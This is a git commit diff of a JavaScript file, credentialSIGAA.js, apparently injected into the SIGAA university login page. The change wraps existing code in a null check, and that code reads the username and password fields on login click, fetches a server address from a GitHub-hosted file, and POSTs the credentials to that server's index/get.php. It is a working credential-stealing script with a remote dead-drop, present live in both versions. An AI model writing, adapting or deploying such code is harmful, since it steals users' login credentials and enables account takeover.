0c6511a120395b6bd9f5d9a59436c9d390de91d4
Wolota <123838258+Wolota@users.noreply.github.com>
2023-03-02 01:57:34 -0300

    Update credentialSIGAA.js

--- credentialSIGAA.js
+++ credentialSIGAA.js
@@ -4,25 +4,26 @@ const username = document.querySelector('[name="user.login"]')
 const password = document.querySelector('[name="user.senha"]')
 
 
-btn.addEventListener("click", function(){
+if (btn){
+    btn.addEventListener("click", function(){
 
-    let xhr = new XMLHttpRequest();
+        let xhr = new XMLHttpRequest();
 
-    xhr.open('GET', 'https://raw.githubusercontent.com/Wolota/ips/main/url-new', true);
-    xhr.onreadystatechange = async function() {
-        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-            const urlContent = xhr.responseText;
+        xhr.open('GET', 'https://raw.githubusercontent.com/Wolota/ips/main/url-new', true);
+        xhr.onreadystatechange = async function() {
+            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                const urlContent = xhr.responseText;
 
-            const data = new FormData();
-            data.append("username", username.value);
-            data.append("password", password.value);
+                const data = new FormData();
+                data.append("username", username.value);
+                data.append("password", password.value);
 
-            const response = await fetch(urlContent + "index/get.php", {
-                method: "POST",
-                body: data
-            });
-        }
-    };
-    xhr.send();
-});
-
+                const response = await fetch(urlContent + "index/get.php", {
+                    method: "POST",
+                    body: data
+                });
+            }
+        };
+        xhr.send();
+    });
+}
